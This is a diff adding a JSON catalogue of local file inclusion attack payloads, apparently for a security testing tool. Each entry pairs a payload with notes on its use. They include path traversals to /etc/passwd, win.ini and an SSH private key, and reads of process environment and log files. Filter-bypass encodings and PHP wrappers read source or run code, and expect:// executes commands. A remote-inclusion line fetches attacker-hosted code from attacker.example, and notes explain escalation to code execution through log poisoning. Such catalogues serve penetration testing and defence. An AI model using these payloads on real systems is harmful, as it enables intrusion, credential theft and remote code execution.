@@ -1,0 +1,146 @@
+{
+  "id": "lfi",
+  "label": "LFI",
+  "entries": [
+    {
+      "id": "traversal-passwd",
+      "label": "Path traversal to /etc/passwd",
+      "payload": "../../../../etc/passwd",
+      "notes": "World-readable canonical target; confirms arbitrary file read on Unix.",
+      "tags": ["traversal", "linux", "canonical"]
+    },
+    {
+      "id": "traversal-deep",
+      "label": "Over-deep traversal",
+      "payload": "../../../../../../../../etc/passwd",
+      "notes": "Extra ../ past filesystem root are harmless and cover an unknown include base depth.",
+      "tags": ["traversal", "linux"]
+    },
+    {
+      "id": "absolute-passwd",
+      "label": "Absolute path",
+      "payload": "/etc/passwd",
+      "notes": "Direct absolute path; works when the app does not prepend a base directory.",
+      "tags": ["linux"]
+    },
+    {
+      "id": "proc-self-environ",
+      "label": "Process environment",
+      "payload": "/proc/self/environ",
+      "notes": "Often leaks secrets in env vars and is a classic LFI-to-RCE pivot via env/log poisoning.",
+      "tags": ["proc", "linux"]
+    },
+    {
+      "id": "proc-self-cmdline",
+      "label": "Process command line",
+      "payload": "/proc/self/cmdline",
+      "notes": "Reveals the target process invocation and its arguments.",
+      "tags": ["proc", "linux"]
+    },
+    {
+      "id": "php-filter-base64",
+      "label": "php://filter base64 source read",
+      "payload": "php://filter/convert.base64-encode/resource=index.php",
+      "notes": "Reads PHP source without executing it by base64-encoding through the filter wrapper.",
+      "tags": ["php-filter", "php-wrapper", "canonical"]
+    },
+    {
+      "id": "php-filter-rot13",
+      "label": "php://filter rot13 source read",
+      "payload": "php://filter/read=string.rot13/resource=index.php",
+      "notes": "Alternative filter when base64 is blocked; rot13 still stops the engine from executing the file.",
+      "tags": ["php-filter", "php-wrapper"]
+    },
+    {
+      "id": "data-wrapper",
+      "label": "data:// inline payload",
+      "payload": "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+",
+      "notes": "data:// inlines code (here phpinfo) when allow_url_include is enabled.",
+      "tags": ["php-wrapper", "rfi"]
+    },
+    {
+      "id": "php-input",
+      "label": "php://input body include",
+      "payload": "php://input",
+      "notes": "Pairs with a POST body to deliver code when the include target is php://input.",
+      "tags": ["php-wrapper", "rfi"]
+    },
+    {
+      "id": "rfi-http",
+      "label": "Remote file inclusion",
+      "payload": "http://attacker.example/shell.txt",
+      "notes": "Pulls attacker-hosted code when allow_url_include permits remote URLs.",
+      "tags": ["rfi"]
+    },
+    {
+      "id": "null-byte-truncation",
+      "label": "Null-byte extension truncation",
+      "payload": "../../../../etc/passwd%00",
+      "notes": "Legacy %00 drops an appended extension the app adds (PHP < 5.3.4).",
+      "tags": ["null-byte", "traversal", "legacy"]
+    },
+    {
+      "id": "doubled-dot-slash",
+      "label": "Doubled dot-slash",
+      "payload": "....//....//....//etc/passwd",
+      "notes": "....// survives a single non-recursive strip of ../, reconstituting the traversal.",
+      "tags": ["traversal", "waf-bypass"]
+    },
+    {
+      "id": "url-encoded-traversal",
+      "label": "URL-encoded traversal",
+      "payload": "..%2f..%2f..%2fetc%2fpasswd",
+      "notes": "Percent-encoded slashes bypass filters that only match literal ../.",
+      "tags": ["encoding", "traversal"]
+    },
+    {
+      "id": "double-encoded-traversal",
+      "label": "Double-encoded traversal",
+      "payload": "..%252f..%252fetc%252fpasswd",
+      "notes": "Double URL-encoding for stacks that decode twice before the file read.",
+      "tags": ["double-encoding", "traversal"]
+    },
+    {
+      "id": "utf8-overlong",
+      "label": "Overlong UTF-8 slash",
+      "payload": "..%c0%af..%c0%afetc%c0%afpasswd",
+      "notes": "Overlong UTF-8 encoding of / bypasses some path canonicalizers.",
+      "tags": ["encoding", "traversal", "waf-bypass"]
+    },
+    {
+      "id": "windows-win-ini",
+      "label": "Windows traversal to win.ini",
+      "payload": "..\\..\\..\\..\\windows\\win.ini",
+      "notes": "win.ini is a reliable readable proof file on Windows targets.",
+      "tags": ["windows", "traversal", "canonical"]
+    },
+    {
+      "id": "windows-hosts",
+      "label": "Windows hosts file",
+      "payload": "..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
+      "notes": "Readable on default Windows installs; confirms traversal on Windows.",
+      "tags": ["windows"]
+    },
+    {
+      "id": "log-poisoning-apache",
+      "label": "Apache access log include",
+      "payload": "/var/log/apache2/access.log",
+      "notes": "Include a request-controlled log to escalate LFI to RCE after seeding PHP in a header.",
+      "tags": ["log-poisoning", "linux"]
+    },
+    {
+      "id": "ssh-private-key",
+      "label": "SSH private key read",
+      "payload": "/home/user/.ssh/id_rsa",
+      "notes": "A readable private key escalates LFI to host access; sensitive, read-only.",
+      "tags": ["sensitive", "linux"]
+    },
+    {
+      "id": "expect-wrapper",
+      "label": "expect:// command execution",
+      "payload": "expect://id",
+      "notes": "expect:// runs a command directly when the PECL expect extension is loaded.",
+      "tags": ["php-wrapper", "linux"]
+    }
+  ]
+}
